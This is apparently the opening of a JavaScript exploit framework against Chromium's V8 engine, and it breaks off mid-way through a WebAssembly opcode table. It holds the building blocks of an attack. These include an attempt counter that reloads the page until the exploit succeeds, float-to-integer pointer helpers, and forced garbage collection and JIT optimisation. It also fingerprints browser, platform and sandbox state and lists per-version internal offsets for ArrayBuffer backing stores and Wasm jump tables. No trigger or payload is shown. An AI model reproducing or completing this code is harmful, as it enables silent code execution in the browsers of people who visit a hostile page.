var stEl = { textContent: '' };


window.__b = function(){};
window.addEventListener('error', (e) => window.__b('ONERROR ' + e.message + ' @' + (e.filename||'') + ':' + e.lineno));
window.addEventListener('unhandledrejection', (e) => window.__b('REJECTION ' + e.reason));

var PWN2_KEY = 'pwn2_attempt';
var pwn2_attempt = 0;
try { pwn2_attempt = +(sessionStorage.getItem(PWN2_KEY) || 0); } catch (e) {}
try { sessionStorage.setItem(PWN2_KEY, String(pwn2_attempt + 1)); } catch (e) {}
window.__pwn_retry = () => {
    if (pwn2_attempt < 4) { setTimeout(() => location.reload(), 400); }
    else { log('[!] gave up after 5 attempts', -1); try { sessionStorage.removeItem(PWN2_KEY); } catch(e){} }
};
window.__pwn_done = () => { try { sessionStorage.removeItem(PWN2_KEY); } catch(e){} };
let loglevel = 5;
var [RETRY, RELOAD, clean] = [0, false, () => {}];
function log(msg, level=0) {
    if (level <= loglevel) {
        let line = "\t".repeat((level >= 0) ? level : 0) + msg;
        try { stEl.textContent += "\n" + line; } catch(e) {}
        try { console.log(line); } catch(e) {}
        if (typeof window.__b === "function" && /^\s*(\[|\+]|->)/.test(line)) {
            try { window.__b(line.trim().slice(0, 170)); } catch(e) {}
        }
    }
}

log('[*] attempt ' + (pwn2_attempt + 1) + '/5 @ ' + (navigator.userAgent || '?'), -1);

{
    var hex = (val) => val.toString(16);


    {
        let conv_buf = new ArrayBuffer(8);
        let conv_float = new Float64Array(conv_buf);
        let conv_i32 = new Uint32Array(conv_buf);
        let conv_i64 = new BigUint64Array(conv_buf);

        function f2il(v) {
            conv_float[0] = v;
            return conv_i32[0];
        }

        function f2ih(v) {
            conv_float[0] = v;
            return conv_i32[1];
        }

        function f2bi(v) {
            conv_float[0] = v;
            return conv_i64[0];
        }

        function i2f(l, h) {
            conv_i32[0] = l;
            conv_i32[1] = h;
            return conv_float[0];
        }

        function bi2f(v) {
            conv_i64[0] = v;
            return conv_float[0];
        }
    }


    var i16arr = (n) => {
        let buf = new ArrayBuffer(2);
        let arr = new Int8Array(buf);
        let view = new DataView(buf);

        view.setUint16(0, n, true);
        return Array.from(arr);
    }

    var i32arr = (n) => {
        let buf = new ArrayBuffer(4);
        let arr = new Int8Array(buf);
        let view = new DataView(buf);

        view.setUint32(0, n, true);
        return Array.from(arr);
    }

    var i64arr = (n) => {
        let buf = new ArrayBuffer(8);
        let arr = new Int8Array(buf);
        let view = new DataView(buf);

        view.setBigUint64(0, BigInt(n), true);
        return Array.from(arr);
    }


    var stringToArr = (str) => Array.from(str, (x) => x.charCodeAt(0)).concat([0]);
    var stringToArrUtf16 = (str) => Array.from(str, (x) => [x.charCodeAt(0), 0]).flat().concat([0,0]);
    var arrToString = (arr) => Array.from(arr, (x) => x > 0 ? String.fromCharCode(x) : "" ).join("");


    {
        const i64ToU64Offset = 2n**64n;

        function ui64(signedBigInt) {
            return signedBigInt < 0 ? i64ToU64Offset + signedBigInt : signedBigInt;
        }
    }
}

{
    function addResource(path, type="script") {
        let p = new Promise((resolve, reject) => {
            let resource = document.createElement(type);
            resource.src = path;
            resource.async = false;
            resource.defer = false;
            resource.onload = () => resolve(resource);
            resource.onerror = () => reject("[-] Failed to load " + path);
            document.body.appendChild(resource);
        });
        return p;
    }


    function waitElementsLoaded() {
        async function onload(img, resolve) {
            if (document.body.lastChild != img) {
                await waitElementsLoaded();
            }
            document.body.removeChild(img);
            resolve();
        }

        return new Promise((resolve) => {
            let img = document.createElement("img");
            img.src = window.location;
            img.async = false;
            img.defer = false;
            img.style.display = "none";
            img.onload = () => onload(img, resolve);
            img.onerror = () => onload(img, resolve);
            document.body.appendChild(img);
        });
    }
}

{
    function assert(condition, msg="Assertion error", maxtries=3, reload=false) {
        if (!condition) {
            RETRY = maxtries;
            RELOAD = reload;
            throw Error(msg);
        }
    }

    function assertTry(func, msg, maxtries=3, reload=false) {
        try {
            func();
        } catch (error) {
            RETRY = maxtries;
            RELOAD = reload;
            throw Error(`${msg} (${(error.message ? error.message : error)})`);
        }
    }


    let clean_funcs = {}

    function cleaner(func, name="") {
        if (!clean_funcs.hasOwnProperty(name)) {
            clean_funcs[name] = [];
        }
        clean_funcs[name].push(func);
    }

    function clean(name="") {
        if (name !== "" && clean_funcs.hasOwnProperty(name)) {
            for (const func of clean_funcs[name]) {
                try {
                    func();
                } catch (e) {
                    log(e);
                }
            }
            clean_funcs[name] = [];
        } else if (name === "") {
            log("[i] Running all registered memory cleaners");
            for (const func of Object.values(clean_funcs).flat() ) {
                try {
                    func();
                } catch (e) {
                    log(e);
                }
            }
            clean_funcs = {};
        }
    }
}

{
    var untagPtr = (ptr) => (typeof ptr === "bigint") ? ptr & ~1n : Number(BigInt(ptr) & ~1n);
    var tagPtr = (ptr) => (typeof ptr === "bigint") ? ptr | 1n : Number(BigInt(ptr) | 1n);
    var isTaggedPtr = (ptr) => (BigInt(ptr) & 1n) === 1n;
    var isStrongTaggedPtr = (ptr) => (BigInt(ptr) & 3n) === 1n;


    function minorGC() {
        new Array(0x100000).fill(13.37);
    }

    function majorGC() {
        if (FINGERPRINT.platform.bitness === "32") new ArrayBuffer(0x20000000);
        else new ArrayBuffer(0x7fe00000);
    }


    {
        let saved = []
        function saveObject(obj) {
            saved.push(obj);
        }
    }


    function optimize(func, ...args) {
        for (let i = 0; i < 0x50000; i++) {
            func(...args);
        }
    }
}

{
    var FINGERPRINT = {
        "browser": {
            "name": undefined,
            "browser_version": {
                "major": undefined,
                "minor": undefined,
                "build": undefined,
                "patch": undefined
            },
            "chromium_version": {
                "major": undefined,
                "minor": undefined,
                "build": undefined,
                "patch": undefined
            }
        },
        "platform": {
            "arch": undefined,
            "bitness": undefined,
            "os": undefined,
            "os_version": undefined,
            "device": undefined
        },
        "process": {
            "sandboxed": undefined
        }
    }


    let versions_map = new Map();
    let symbols_map = new Map();

    let versionToStr = (version) => {
        if (typeof version === "object" && ["major", "minor", "build", "patch"].every(p => version.hasOwnProperty(p))) {
            version = `${version.major}.${version.minor}.${version.build}.${version.patch}`
        }
        return version
    }

    let hash_keys = (...args) => {
        return JSON.stringify(args);
    }

    function getBrowserToChromiumVersion(browser=undefined, version=undefined) {
        if (typeof browser === "undefined") browser = FINGERPRINT.browser.name;
        if (typeof version === "undefined") version = FINGERPRINT.browser.browser_version;
        return versions_map.get(hash_keys(browser, versionToStr(version)));
    }

    function setBrowserToChromiumVersion(browser, version, chromium) {
        versions_map.set(hash_keys(browser, versionToStr(version)), chromium);
    }

    function getSymbol(symbol_name, browser=undefined, os=undefined, arch=undefined, version=undefined) {
        if (typeof browser === "undefined") browser = FINGERPRINT.browser.name;
        if (typeof os === "undefined") os = FINGERPRINT.platform.os;
        if (typeof arch === "undefined") arch = FINGERPRINT.platform.arch;
        if (typeof version === "undefined") version = FINGERPRINT.browser.browser_version;
        return symbols_map.get(hash_keys(browser, os, arch, versionToStr(version), symbol_name));
    }

    function addSymbol(browser, os, arch, version, symbol_name, symbol_addr) {
        symbols_map.set(hash_keys(browser, os, arch, versionToStr(version), symbol_name), symbol_addr);
    }

}


{
    class V8Struct {
        constructor(base=0x1n) {
            assert(isStrongTaggedPtr(base), `[-] Invalid pointer for ${this.constructor.name} (0x${hex(base)})`);
            this.base = untagPtr(BigInt(base));
        }
    }


    class JSArrayBuffer extends V8Struct {
        get byte_length() {
            if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x10n;
            return this.base + 0x14n;
        }

        get max_byte_length() {
            if (FINGERPRINT.platform.bitness === "32") {
                if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x14n;
                return this.base + 0x18n;
            }

            if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x18n;
            return this.base + 0x1cn;
        }

        get backing_store() {
            if (FINGERPRINT.platform.bitness === "32") {
                if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x18n;
                return this.base + 0x1cn;
            }

            if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x20n;
            return this.base + 0x24n;
        }
    }


    class WasmInstanceObject extends V8Struct {
        get trusted_data() {
            if (FINGERPRINT.browser.chromium_version.major <= 121) return undefined;
            return this.base + 0xcn;
        }

        get jump_table_start() {
            if (FINGERPRINT.platform.bitness === "32") {
                if (FINGERPRINT.browser.chromium_version.major <= 112) return this.base + 0x40n;
                if (FINGERPRINT.browser.chromium_version.major <= 119) return this.base + 0x3cn;
                if (FINGERPRINT.browser.chromium_version.major <= 121) return this.base + 0x38n;
                return undefined;
            }

            if (FINGERPRINT.browser.chromium_version.major <= 112) return this.base + 0x60n;
            if (FINGERPRINT.browser.chromium_version.major <= 113) return this.base + 0x58n;
            if (FINGERPRINT.browser.chromium_version.major <= 119) return this.base + 0x50n;
            if (FINGERPRINT.browser.chromium_version.major <= 121) return this.base + 0x48n;
            return undefined;
        }
    }


    class WasmTrustedInstanceData extends V8Struct {
        get memory0_start() {
            if (FINGERPRINT.browser.chromium_version.major == 122) return this.base + 0x28n;
            return this.base + 0x18n;
        }

        get globals_start() {
            if (FINGERPRINT.browser.chromium_version.major == 122) return this.base + 0x40n;
            if (FINGERPRINT.browser.chromium_version.major <= 125) return this.base + 0x30n;
            return this.base + 0x28n;
        }

        get jump_table_start() {
            if (FINGERPRINT.platform.bitness === "32") {
                if (FINGERPRINT.browser.chromium_version.major == 122) return this.base + 0x30n;
                if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x24n;
                if (FINGERPRINT.browser.chromium_version.major <= 127) return this.base + 0x20n;
                return this.base + 0x1cn;
            }

            if (FINGERPRINT.browser.chromium_version.major == 122) return this.base + 0x48n;
            if (FINGERPRINT.browser.chromium_version.major <= 127) return this.base + 0x38n;
            return this.base + 0x30n;
        }
    }


    var STRUCTS = {
        "JSArrayBuffer": JSArrayBuffer,
        "WasmInstanceObject": WasmInstanceObject,
        "WasmTrustedInstanceData": WasmTrustedInstanceData,
    };
}

{
  if (typeof WasmModuleBuilderLoaded === "undefined") {
    var WasmModuleBuilderLoaded = true;


    var byte_view = new Uint8Array(8);
    var data_view = new DataView(byte_view.buffer);

    function bytes(...input) {
      if (input.length == 1 && typeof input[0] == 'array') input = input[0];
      if (input.length == 1 && typeof input[0] == 'string') {
        let len = input[0].length;
        let view = new Uint8Array(len);
        for (let i = 0; i < len; i++) view[i] = input[0].charCodeAt(i);
        return view.buffer;
      }
      let view = new Uint8Array(input.length);
      for (let i = 0; i < input.length; i++) {
        let val = input[i];
        if (typeof val == 'string') {
          if (val.length != 1) {
            throw new Error('string inputs must have length 1');
          }
          val = val.charCodeAt(0);
        }
        view[i] = val | 0;
      }
      return view.buffer;
    }

    var kWasmH0 = 0;
    var kWasmH1 = 0x61;
    var kWasmH2 = 0x73;
    var kWasmH3 = 0x6d;

    var kWasmV0 = 0x1;
    var kWasmV1 = 0;
    var kWasmV2 = 0;
    var kWasmV3 = 0;

    var kHeaderSize = 8;
    var kPageSize = 65536;
    var kSpecMaxPages = 65536;
    var kMaxVarInt32Size = 5;
    var kMaxVarInt64Size = 10;
    var kSpecMaxFunctionParams = 1_000;

    var kDeclNoLocals = 0;

    var kUnknownSectionCode = 0;
    var kTypeSectionCode = 1;
    var kImportSectionCode = 2;
    var kFunctionSectionCode = 3;
    var kTableSectionCode = 4;
    var kMemorySectionCode = 5;
    var kGlobalSectionCode = 6;
    var kExportSectionCode = 7;
    var kStartSectionCode = 8;
    var kElementSectionCode = 9;
    var kCodeSectionCode = 10;
    var kDataSectionCode = 11;
    var kDataCountSectionCode = 12;
    var kTagSectionCode = 13;
    var kStringRefSectionCode = 14;
    var kLastKnownSectionCode = 14;

    var kModuleNameCode = 0;
    var kFunctionNamesCode = 1;
    var kLocalNamesCode = 2;

    var kWasmSharedTypeForm = 0x65;
    var kWasmFunctionTypeForm = 0x60;
    var kWasmStructTypeForm = 0x5f;
    var kWasmArrayTypeForm = 0x5e;
    var kWasmContTypeForm = 0x5d;
    var kWasmSubtypeForm = 0x50;
    var kWasmSubtypeFinalForm = 0x4f;
    var kWasmRecursiveTypeGroupForm = 0x4e;
    var kWasmDescriptorTypeForm = 0x4d;
    var kWasmDescribesTypeForm = 0x4c;

    var kNoSuperType = 0xFFFFFFFF;

    var kLimitsNoMaximum = 0x00;
    var kLimitsWithMaximum = 0x01;
    var kLimitsSharedNoMaximum = 0x02;
    var kLimitsSharedWithMaximum = 0x03;
    var kLimitsMemory64NoMaximum = 0x04;
    var kLimitsMemory64WithMaximum = 0x05;
    var kLimitsMemory64SharedNoMaximum = 0x06;
    var kLimitsMemory64SharedWithMaximum = 0x07;

    var kActiveNoIndex = 0;
    var kPassive = 1;
    var kActiveWithIndex = 2;
    var kDeclarative = 3;
    var kPassiveWithElements = 5;
    var kDeclarativeWithElements = 7;

    var kDeclFunctionName = 0x01;
    var kDeclFunctionImport = 0x02;
    var kDeclFunctionLocals = 0x04;
    var kDeclFunctionExport = 0x08;

    var kWasmVoid = 0x40;
    var kWasmI32 = 0x7f;
    var kWasmI64 = 0x7e;
    var kWasmF32 = 0x7d;
    var kWasmF64 = 0x7c;
    var kWasmS128 = 0x7b;
    var kWasmI8 = 0x78;
    var kWasmI16 = 0x77;
    var kWasmF16 = 0x76;

    var kWasmNullFuncRef = -0x0d;
    var kWasmNullExternRef = -0x0e;
    var kWasmNullRef = -0x0f;
    var kWasmFuncRef = -0x10;
    var kWasmAnyFunc = kWasmFuncRef;
    var kWasmExternRef = -0x11;
    var kWasmAnyRef = -0x12;
    var kWasmEqRef = -0x13;
    var kWasmI31Ref = -0x14;
    var kWasmStructRef = -0x15;
    var kWasmArrayRef = -0x16;
    var kWasmExnRef = -0x17;
    var kWasmNullExnRef = -0x0c;
    var kWasmStringRef = -0x19;
    var kWasmStringViewWtf8 = -0x1a;
    var kWasmStringViewWtf16 = -0x20;
    var kWasmStringViewIter = -0x1f;
    var kWasmContRef = -0x18;
    var kWasmNullContRef = -0x0b;

    var kLeb128Mask = 0x7f;
    var kFuncRefCode = kWasmFuncRef & kLeb128Mask;
    var kAnyFuncCode = kFuncRefCode;
    var kExternRefCode = kWasmExternRef & kLeb128Mask;
    var kAnyRefCode = kWasmAnyRef & kLeb128Mask;
    var kEqRefCode = kWasmEqRef & kLeb128Mask;
    var kI31RefCode = kWasmI31Ref & kLeb128Mask;
    var kNullExternRefCode = kWasmNullExternRef & kLeb128Mask;
    var kNullFuncRefCode = kWasmNullFuncRef & kLeb128Mask;
    var kStructRefCode = kWasmStructRef & kLeb128Mask;
    var kArrayRefCode = kWasmArrayRef & kLeb128Mask;
    var kExnRefCode = kWasmExnRef & kLeb128Mask;
    var kNullExnRefCode = kWasmNullExnRef & kLeb128Mask;
    var kNullRefCode = kWasmNullRef & kLeb128Mask;
    var kStringRefCode = kWasmStringRef & kLeb128Mask;
    var kStringViewWtf8Code = kWasmStringViewWtf8 & kLeb128Mask;
    var kStringViewWtf16Code = kWasmStringViewWtf16 & kLeb128Mask;
    var kStringViewIterCode = kWasmStringViewIter & kLeb128Mask;
    var kContRefCode = kWasmContRef & kLeb128Mask;
    var kNullContRefCode = kWasmNullContRef & kLeb128Mask;

    var kWasmRefNull = 0x63;
    var kWasmRef = 0x64;
    var kWasmExact = 0x62;

    globalThis.RefTypeBuilder = class {
      constructor(opcode, heap_type) {
        this.opcode = opcode;
        this.heap_type = heap_type;
        this.is_shared = false;
        this.is_exact = false;
      }
      nullable() {
        this.opcode = kWasmRefNull;
        return this;
      }
      shared() {
        this.is_shared = true;
        return this;
      }
      exact() {
        this.is_exact = true;
        return this;
      }
    }
    function wasmRefNullType(heap_type) {
      return new RefTypeBuilder(kWasmRefNull, heap_type);
    }
    function wasmRefType(heap_type) {
      return new RefTypeBuilder(kWasmRef, heap_type);
    }

    var kExternalFunction = 0;
    var kExternalTable = 1;
    var kExternalMemory = 2;
    var kExternalGlobal = 3;
    var kExternalTag = 4;
    var kExternalExactFunction = 32;

    var kTableZero = 0;
    var kMemoryZero = 0;
    var kSegmentZero = 0;

    var kExceptionAttribute = 0;

    var kAtomicSeqCst = 0;
    var kAtomicAcqRel = 1;

    var kSig_i_i = makeSig([kWasmI32], [kWasmI32]);
    var kSig_l_l = makeSig([kWasmI64], [kWasmI64]);
    var kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
    var kSig_i_ii = makeSig([kWasmI32, kWasmI32], [kWasmI32]);
    var kSig_i_iii = makeSig([kWasmI32, kWasmI32, kWasmI32], [kWasmI32]);
    var kSig_i_iiii = makeSig([kWasmI32, kWasmI32, kWasmI32, kWasmI32], [kWasmI32]);
    var kSig_v_iiii = makeSig([kWasmI32, kWasmI32, kWasmI32, kWasmI32], []);
    var kSig_l_iiii = makeSig([kWasmI32, kWasmI32, kWasmI32, kWasmI32], [kWasmI64]);
    var kSig_l_i = makeSig([kWasmI32], [kWasmI64]);
    var kSig_f_i = makeSig([kWasmI32], [kWasmF32]);
    var kSig_i_f = makeSig([kWasmF32], [kWasmI32]);
    var kSig_i_ff = makeSig([kWasmF32, kWasmF32], [kWasmI32]);
    var kSig_f_ff = makeSig([kWasmF32, kWasmF32], [kWasmF32]);
    var kSig_f_ffff = makeSig([kWasmF32, kWasmF32, kWasmF32, kWasmF32], [kWasmF32]);
    var kSig_d_dd = makeSig([kWasmF64, kWasmF64], [kWasmF64]);
    var kSig_d_dddd = makeSig([kWasmF64, kWasmF64, kWasmF64, kWasmF64], [kWasmF64]);
    var kSig_l_ll = makeSig([kWasmI64, kWasmI64], [kWasmI64]);
    var kSig_l_llll = makeSig([kWasmI64, kWasmI64, kWasmI64, kWasmI64], [kWasmI64]);
    var kSig_i_dd = makeSig([kWasmF64, kWasmF64], [kWasmI32]);
    var kSig_v_v = makeSig([], []);
    var kSig_i_v = makeSig([], [kWasmI32]);
    var kSig_l_v = makeSig([], [kWasmI64]);
    var kSig_f_v = makeSig([], [kWasmF32]);
    var kSig_d_v = makeSig([], [kWasmF64]);
    var kSig_v_i = makeSig([kWasmI32], []);
    var kSig_v_ii = makeSig([kWasmI32, kWasmI32], []);
    var kSig_v_iii = makeSig([kWasmI32, kWasmI32, kWasmI32], []);
    var kSig_v_l = makeSig([kWasmI64], []);
    var kSig_v_li = makeSig([kWasmI64, kWasmI32], []);
    var kSig_v_lii = makeSig([kWasmI64, kWasmI32, kWasmI32], []);
    var kSig_v_d = makeSig([kWasmF64], []);
    var kSig_v_dd = makeSig([kWasmF64, kWasmF64], []);
    var kSig_v_ddi = makeSig([kWasmF64, kWasmF64, kWasmI32], []);
    var kSig_ii_v = makeSig([], [kWasmI32, kWasmI32]);
    var kSig_iii_v = makeSig([], [kWasmI32, kWasmI32, kWasmI32]);
    var kSig_ii_i = makeSig([kWasmI32], [kWasmI32, kWasmI32]);
    var kSig_iii_i = makeSig([kWasmI32], [kWasmI32, kWasmI32, kWasmI32]);
    var kSig_ii_ii = makeSig([kWasmI32, kWasmI32], [kWasmI32, kWasmI32]);
    var kSig_iii_ii = makeSig([kWasmI32, kWasmI32], [kWasmI32, kWasmI32, kWasmI32]);

    var kSig_v_f = makeSig([kWasmF32], []);
    var kSig_f_f = makeSig([kWasmF32], [kWasmF32]);
    var kSig_f_d = makeSig([kWasmF64], [kWasmF32]);
    var kSig_d_d = makeSig([kWasmF64], [kWasmF64]);
    var kSig_d_f = makeSig([kWasmF32], [kWasmF64]);
    var kSig_d_i = makeSig([kWasmI32], [kWasmF64]);
    var kSig_r_r = makeSig([kWasmExternRef], [kWasmExternRef]);
    var kSig_a_a = makeSig([kWasmAnyFunc], [kWasmAnyFunc]);
    var kSig_i_r = makeSig([kWasmExternRef], [kWasmI32]);
    var kSig_v_r = makeSig([kWasmExternRef], []);
    var kSig_v_a = makeSig([kWasmAnyFunc], []);
    var kSig_v_rr = makeSig([kWasmExternRef, kWasmExternRef], []);
    var kSig_v_aa = makeSig([kWasmAnyFunc, kWasmAnyFunc], []);
    var kSig_r_v = makeSig([], [kWasmExternRef]);
    var kSig_a_v = makeSig([], [kWasmAnyFunc]);
    var kSig_a_i = makeSig([kWasmI32], [kWasmAnyFunc]);
    var kSig_s_i = makeSig([kWasmI32], [kWasmS128]);
    var kSig_i_s = makeSig([kWasmS128], [kWasmI32]);

    function makeSig(params, results) {
      return {params: params, results: results};
    }

    function makeSig_v_x(x) {
      return makeSig([x], []);
    }

    function makeSig_x_v(x) {
      return makeSig([], [x]);
    }

    function makeSig_v_xx(x) {
      return makeSig([x, x], []);
    }

    function makeSig_r_v(r) {
      return makeSig([], [r]);
    }

    function makeSig_r_x(r, x) {
      return makeSig([x], [r]);
    }

    function makeSig_r_xx(r, x) {
      return makeSig([x, x], [r]);
    }

    var kWasmOpcodes = {
      'Unreachable': 0x00,
      'Nop': 0x01,
      'Block': 0x02,
      'Loop': 0x03,
      'If': 0x04,
      'Else': 0x05,
      'Try': 0x06,
      'TryTable': 0x1f,
      'ThrowRef': 0x0a,
      'Catch': 0x07,
      'Throw': 0x08,
      'Rethrow': 0x09,
      'CatchAll': 0x19,
      'End': 0x0b,
      'Br': 0x0c,
      'BrIf': 0x0d,
      'BrTable': 0x0e,
      'Return': 0x0f,
      'CallFunction': 0x10,
      'CallIndirect': 0x11,
      'ReturnCall': 0x12,
      'ReturnCallIndirect': 0x13,
      'CallRef': 0x14,
      'ReturnCallRef': 0x15,
      'NopForTestingUnsupportedInLiftoff': 0x16,
      'Delegate': 0x18,
      'Drop': 0x1a,
      'Select': 0x1b,
      'SelectWithType': 0x1c,
      'LocalGet': 0x20,
      'LocalSet': 0x21,
      'LocalTee': 0x22,
      'GlobalGet': 0x23,
      'GlobalSet': 0x24,
      'TableGet': 0x25,
      'TableSet': 0x26,
      'I32LoadMem': 0x28,
      'I64LoadMem': 0x29,
      'F32LoadMem': 0x2a,
      'F64LoadMem': 0x2b,
      'I32LoadMem8S': 0x2c,
      'I32LoadMem8U': 0x2d,
      'I32LoadMem16S': 0x2e,
      'I32LoadMem16U': 0x2f,
      'I64LoadMem8S': 0x30,
      'I64LoadMem8U': 0x31,
      'I64LoadMem16S': 0x32,
      'I64LoadMem16U': 0x33,
      'I64LoadMem32S': 0x34,
      'I64LoadMem32U': 0x35,
      'I32StoreMem': 0x36,
      'I64StoreMem': 0x37,
      'F32StoreMem': 0x38,
      'F64StoreMem': 0x39,
      'I32StoreMem8': 0x3a,
      'I32StoreMem16': 0x3b,
      'I64StoreMem8': 0x3c,
      'I64StoreMem16': 0x3d,
      'I64StoreMem32': 0x3e,
      'MemorySize': 0x3f,
      'MemoryGrow': 0x40,
      'I32Const': 0x41,
      'I64Const': 0x42,
      'F32Const': 0x43,
      'F64Const': 0x44,
      'I32Eqz': 0x45,
      'I32Eq': 0x46,
      'I32Ne': 0x47,
      'I32LtS': 0x48,
      'I32LtU': 0x49,
      'I32GtS': 0x4a,
      'I32GtU': 0x4b,
      'I32LeS': 0x4c,
      'I32LeU': 0x4d,
      'I32GeS': 0x4e,
      'I32GeU': 0x4f,
      'I64Eqz': 0x50,
      'I64Eq': 0x51,
      'I64Ne': 0x52,
      'I64LtS': 0x53,
      'I64LtU': 0x54,
      'I64GtS': 0x55,
      'I64GtU': 0x56,
      'I64LeS': 0x57,
      'I64LeU': 0x58,
      'I64GeS': 0x59,
      'I64GeU': 0x5a,
      'F32Eq': 0x5b,
      'F32Ne': 0x5c,
      'F32Lt': 0x5d,
      'F32Gt': 0x5e,
      'F32Le': 0x5f,
      'F32Ge': 0x60,
      'F64Eq': 0x61,
      'F64Ne': 0x62,
      'F64Lt': 0x63,
      'F64Gt': 0x64,
      'F64Le': 0x65,
      'F64Ge': 0x66,
      'I32Clz': 0x67,
      'I32Ctz': 0x68,
      'I32Popcnt': 0x69,
      'I32Add': 0x6a,
      'I32Sub': 0x6b,
      'I32Mul': 0x6c,
      'I32DivS': 0x6d,
      'I32DivU': 0x6e,
      'I32RemS': 0x6f,
      'I32RemU': 0x70,
      'I32And': 0x71,
      'I32Ior': 0x72,
      'I32Xor': 0x73,
      'I32Shl': 0x74,
      'I32ShrS': 0x75,
      'I32ShrU': 0x76,
      'I32Rol': 0x77,
      'I32Ror': 0x78,
      'I64Clz': 0x79,
      'I64Ctz': 0x7a,
      'I64Popcnt': 0x7b,
      'I64Add': 0x7c,
      'I64Sub': 0x7d,
      'I64Mul': 0x7e,
      'I64DivS': 0x7f,
      'I64DivU': 0x80,
      'I64RemS': 0x81,
      'I64RemU': 0x82,
      'I64And': 0x83,
      'I64Ior': 0x84,
      'I64Xor': 0x85,
      'I64Shl': 0x86,
      'I64ShrS': 0x87,
      'I64ShrU': 0x88,
      'I64Rol': 0x89,
      'I64Ror': 0x8a,
      'F32Abs': 0x8b,
      'F32Neg': 0x8c,
      'F32Ceil': 0x8d,
      'F32Floor': 0x8e,
      'F32Trunc': 0x8f,
      'F32NearestInt': 0x90,
      'F32Sqrt': 0x91,
      'F32Add': 0x92,
      'F32Sub': 0x93,
      'F32Mul': 0x94,
      'F32Div': 0x95,
      'F32Min': 0x96,
      'F32Max': 0x97,
      'F32CopySign': 0x98,
      'F64Abs': 0x99,
      'F64Neg': 0x9a,
      'F64Ceil': 0x9b,
      'F64Floor': 0x9c,
      'F64Trunc': 0x9d,
      'F64NearestInt': 0x9e,
      'F64Sqrt': 0x9f,
      'F64Add': 0xa0,
      'F64Sub': 0xa1,
      'F64Mul': 0xa2,
      'F64Div': 0xa3,
      'F64Min': 0xa4,
      'F64Max': 0xa5,
      'F64CopySign': 0xa6,
      'I32ConvertI64': 0xa7,
      'I32SConvertF32': 0xa8,
      'I32UConvertF32': 0xa9,
      'I32SConvertF64': 0xaa,
      'I32UConvertF64': 0xab,
      'I64SConvertI32': 0xac,
      'I64UConvertI32': 0xad,
      'I64SConvertF32': 0xae,
      'I64UConvertF32': 0xaf,
      'I64SConvertF64': 0xb0,
      'I64UConvertF64': 0xb1,
      'F32SConvertI32': 0xb2,
      'F32UConvertI32': 0xb3,
      'F32SConvertI64': 0xb4,
      'F32UConvertI64': 0xb5,
      'F32ConvertF64': 0xb6,
      'F64SConvertI32': 0xb7,
      'F64UConvertI32': 0xb8,
      'F64SConvertI64': 0xb9,
      'F64UConvertI64': 0xba,
      'F64ConvertF32': 0xbb,
      'I32ReinterpretF32': 0xbc,
      'I64ReinterpretF64': 0xbd,
      'F32ReinterpretI32': 0xbe,
      'F64ReinterpretI64': 0xbf,
      'I32SExtendI8': 0xc0,
      'I32SExtendI16': 0xc1,
      'I64SExtendI8': 0xc2,
      'I64SExtendI16': 0xc3,
      'I64SExtendI32': 0xc4,
      'RefNull': 0xd0,
      'RefIsNull': 0xd1,
      'RefFunc': 0xd2,
      'RefEq': 0xd3,
      'RefAsNonNull': 0xd4,
      'BrOnNull': 0xd5,
      'BrOnNonNull': 0xd6,
      'ContNew': 0xe0,
      'ContBind': 0xe1,
      'Suspend': 0xe2,
      'Resume': 0xe3,
      'ResumeThrow': 0xe4,
      'ResumeThrowRef': 0xe5,
      'Switch': 0xe6
    };

    function defineWasmOpcode(name, value) {
      if (globalThis.kWasmOpcodeNames === undefined) {
        globalThis.kWasmOpcodeNames = {};
      }
      Object.defineProperty(globalThis, name, {value: value});
      if (globalThis.kWasmOpcodeNames[value] !== undefined) {
        throw new Error(`Duplicate wasm opcode: ${value}. Previous name: ${
            globalThis.kWasmOpcodeNames[value]}, new name: ${name}`);
      }
      globalThis.kWasmOpcodeNames[value] = name;
    }
    for (let name in kWasmOpcodes) {
      defineWasmOpcode(`kExpr${name}`, kWasmOpcodes[name]);
    }

    var kPrefixOpcodes = {
      'GC': 0xfb,
      'Numeric': 0xfc,
      'Simd': 0xfd,
      'Atomic': 0xfe
    };
    for (let prefix in kPrefixOpcodes) {
      defineWasmOpcode(`k${prefix}Prefix`, kPrefixOpcodes[prefix]);
    }

    function SimdInstr(opcode) {
      if (opcode <= 0x7F) return [kSimdPrefix, opcode];
      return [kSimdPrefix, 0x80 | (opcode & 0x7F), opcode >> 7];
    }
    function GCInstr(opcode) {
      if (opcode <= 0x7F) return [kGCPrefix, opcode];
      return [kGCPrefix, 0x80 | (opcode & 0x7F), opcode >> 7];
    }

    var kExprStructNew = 0x00;
    var kExprStructNewDefault = 0x01;
    var kExprStructGet = 0x02;
    var kExprStructGetS = 0x03;
    var kExprStructGetU = 0x04;
    var kExprStructSet = 0x05;
    var kExprArrayNew = 0x06;
    var kExprArrayNewDefault = 0x07;
    var kExprArrayNewFixed = 0x08;
    var kExprArrayNewData = 0x09;
    var kExprArrayNewElem = 0x0a;
    var kExprArrayGet = 0x0b;
    var kExprArrayGetS = 0x0c;
    var kExprArrayGetU = 0x0d;
    var kExprArraySet = 0x0e;
    var kExprArrayLen = 0x0f;
    var kExprArrayFill = 0x10;
    var kExprArrayCopy = 0x11;
    var kExprArrayInitData = 0x12;
    var kExprArrayInitElem = 0x13;
    var kExprRefTest = 0x14;
    var kExprRefTestNull = 0x15;
    var kExprRefCast = 0x16;
    var kExprRefCastNull = 0x17;
    var kExprBrOnCast = 0x18;
    var kExprBrOnCastFail = 0x19;
    var kExprAnyConvertExtern = 0x1a;
    var kExprExternConvertAny = 0x1b;
    var kExprRefI31 = 0x1c;
    var kExprI31GetS = 0x1d;
    var kExprI31GetU = 0x1e;
    var kExprRefI31Shared = 0x1f;
    var kExprStructNewDesc = 0x20;
    var kExprStructNewDefaultDesc = 0x21;
    var kExprRefGetDesc = 0x22;
    var kExprRefCastDesc = 0x23;
    var kExprRefCastDescNull = 0x24;
    var kExprBrOnCastDesc = 0x25;
    var kExprBrOnCastDescFail = 0x26;

    var kExprRefCastNop = 0x4c;

    var kExprStringNewUtf8 = 0x80;
    var kExprStringNewWtf16 = 0x81;
    var kExprStringConst = 0x82;
    var kExprStringMeasureUtf8 = 0x83;
